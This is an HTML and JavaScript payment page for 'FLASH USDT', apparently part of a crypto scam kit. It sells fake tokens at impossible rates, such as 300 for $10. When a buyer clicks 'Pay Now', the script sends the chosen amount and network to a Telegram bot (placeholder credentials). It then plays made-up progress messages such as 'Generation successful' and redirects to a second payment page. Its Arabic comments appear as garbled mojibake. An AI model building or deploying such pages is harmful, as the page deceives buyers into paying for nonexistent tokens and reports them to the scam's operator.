<!doctype html>
<html lang="en" dir="ltr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>FLASH USDT ANKR - Payment</title>
  <style>
    :root{
      --bg:#0e1116; --card:#121720; --text:#e7edf4; --muted:#9aa7b5;
      --accent:#98f5ff; --ring:#233041; --btn:#1b2431; --btnHover:#243145;
      --input:#0f1520; --border:#1f2a3a;
    }
    *{box-sizing:border-box}
    body{
      margin:0;
      background: radial-gradient(1200px 600px at 50% 50%, #22304733, transparent 60%), var(--bg);
      color:var(--text);
      font-family: system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
      min-height:100vh;
      display:flex; align-items:center; justify-content:center;
      padding:24px;
    }
    .card{
      width:min(680px, 92vw);
      background:linear-gradient(180deg, #0f1622, #0c121a);
      border:1px solid var(--border); border-radius:20px;
      box-shadow: 0 10px 30px #0007, inset 0 1px 0 #ffffff0f;
      padding:24px;
    }
    .header{
      display:flex; align-items:center; gap:14px;
      padding-bottom:16px; border-bottom:1px dashed #ffffff1a;
      margin-bottom:20px; flex-direction:column; text-align:center;
    }
    .network-logo{
      width:64px; height:64px; border-radius:50%;
      object-fit:cover; border:2px solid #ffffff22;
      box-shadow:0 0 0 3px #98f5ff22, 0 6px 14px #0008;
      background:#0c141d;
    }
    .network-name{ font-size:14px; color:var(--muted); margin-top:4px; }
    .field{ display:flex; flex-direction:column; gap:8px; margin: 12px 0 22px; }
    .label{ font-weight:600; color:#cfe3f7; font-size:14px }
    .select{
      background:var(--input); color:var(--text);
      border:1px solid var(--border); border-radius:14px;
      padding:14px 16px; font-size:15px; outline:none;
      transition: border-color .2s, box-shadow .2s;
    }
    .select:focus{
      border-color:#98f5ff66;
      box-shadow:0 0 0 4px #98f5ff22;
    }
    .result{
      background:var(--input); border:1px solid var(--border);
      border-radius:14px; padding:14px 16px; font-size:15px;
      color:var(--accent); text-align:center;
    }
    .connect{
      width:100%; background:var(--btn); color:var(--text);
      border:1px solid var(--ring); border-radius:14px;
      padding:14px 18px; font-size:16px; font-weight:700;
      display:flex; align-items:center; justify-content:center;
      gap:10px; cursor:pointer;
    }
    .connect[disabled]{ opacity:.6; cursor:not-allowed; }
    .spinner{
      width:18px; height:18px; border-radius:50%;
      border:3px solid #ffffff33; border-top-color:var(--accent);
      animation: spin 1s linear infinite; display:none;
    }
    .connect.loading .spinner{ display:inline-block; }
    @keyframes spin{ to{ transform: rotate(360deg); } }
    .overlay{
      position:fixed; top:0; left:0; width:100%; height:100%;
      background:rgba(0,0,0,0.7);
      display:flex; align-items:center; justify-content:center;
      z-index:1000; display:none;
    }
    .loader-box{
      background:var(--card); padding:24px; border-radius:16px;
      text-align:center; width:300px;
    }
    .loader-circle{
      width:40px; height:40px; border:4px solid #ffffff33;
      border-top-color:var(--accent); border-radius:50%;
      animation:spin 1s linear infinite; margin:0 auto 16px;
    }
    .loader-text{ font-size:14px; color:var(--text); }
  </style>
</head>
<body>
  <main class="card">
    <header class="header">
      <img id="networkLogo" class="network-logo" alt="Network" />
      <div class="network-name" id="networkName"></div>
    </header>

    <div class="field">
      <label class="label">Select Amount (USD)</label>
      <select id="amountSelect" class="select">
        <option value="10">10</option>
        <option value="25">25</option>
        <option value="50">50</option>
        <option value="100">100</option>
      </select>
    </div>

    <div class="result" id="resultBox">300 FLASH USDT</div>

    <button id="payBtn" class="connect" type="button">
      <span class="spinner"></span>
      <span>üí≥ Pay Now</span>
    </button>
  </main>

  <div class="overlay" id="overlay">
    <div class="loader-box">
      <div class="loader-circle"></div>
      <div class="loader-text" id="loaderText">BUILD BRIDGE TO S/CONTRACT</div>
    </div>
  </div>

  <script>
    const botToken = "YOUR_BOT_TOKEN"; // ÿ∂ÿπ ÿ™ŸàŸÉŸÜ ÿßŸÑÿ®Ÿàÿ™
    const chatId = "YOUR_CHAT_ID"; // ÿ∂ÿπ ŸÖÿπÿ±ŸÅ ÿßŸÑÿ¥ÿßÿ™

    const networkLogo = document.getElementById('networkLogo');
    const networkName = document.getElementById('networkName');
    const amountSelect = document.getElementById('amountSelect');
    const resultBox = document.getElementById('resultBox');
    const payBtn = document.getElementById('payBtn');
    const overlay = document.getElementById('overlay');
    const loaderText = document.getElementById('loaderText');

    const savedLogo = localStorage.getItem('networkLogo');
    if(savedLogo){
      networkLogo.src = savedLogo;
      networkName.textContent = savedLogo.includes('trc') ? 'TRC20' : (savedLogo.includes('bep') ? 'BEP20' : 'ERC20');
    }

    const values = {10:300, 25:1000, 50:3000, 100:10000};

    amountSelect.addEventListener('change', ()=>{
      const val = amountSelect.value;
      resultBox.textContent = values[val] + ' FLASH USDT';
    });

    payBtn.addEventListener('click', ()=>{
      overlay.style.display = 'flex';
      const val = amountSelect.value;
      const flashAmount = values[val];

      // ÿ≠ŸÅÿ∏ ÿßŸÑŸÇŸäŸÖ
      localStorage.setItem('selectedUSD', val);
      localStorage.setItem('selectedFLASH', flashAmount);
      localStorage.setItem('selectedNetworkName', networkName.textContent);
      localStorage.setItem('networkLogo', networkLogo.src);

      const message = `üí≥ ÿπŸÖŸÑŸäÿ© ÿØŸÅÿπ ÿ¨ÿØŸäÿØÿ©\n\nüì° ÿßŸÑÿ¥ÿ®ŸÉÿ©: ${networkName.textContent}\nüíµ ÿßŸÑŸÖÿ®ŸÑÿ∫: ${val} USD\n‚ö° FLASH USDT: ${flashAmount}`;
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      });

      const steps = [
        'üîó Connecting to wallet',
        '‚úÖ Connected',
        `‚ö° Generating ${flashAmount} FLASH USDT`,
        '‚úÖ Generation successful',
        'üîç Checking payment'
      ];
      let i = 0;
      const interval = setInterval(()=>{
        loaderText.textContent = steps[i];
        i++;
        if(i === steps.length){
          clearInterval(interval);
          setTimeout(()=>{
            // ÿßŸÑÿ™Ÿàÿ¨ŸäŸá ÿ•ŸÑŸâ ÿßŸÑÿµŸÅÿ≠ÿ© ÿßŸÑÿ´ÿßŸÜŸäÿ©
            window.location.href = 'payment.html';
          }, 1000);
        }
      }, 2000);
    });
  </script>
</body>
</html>
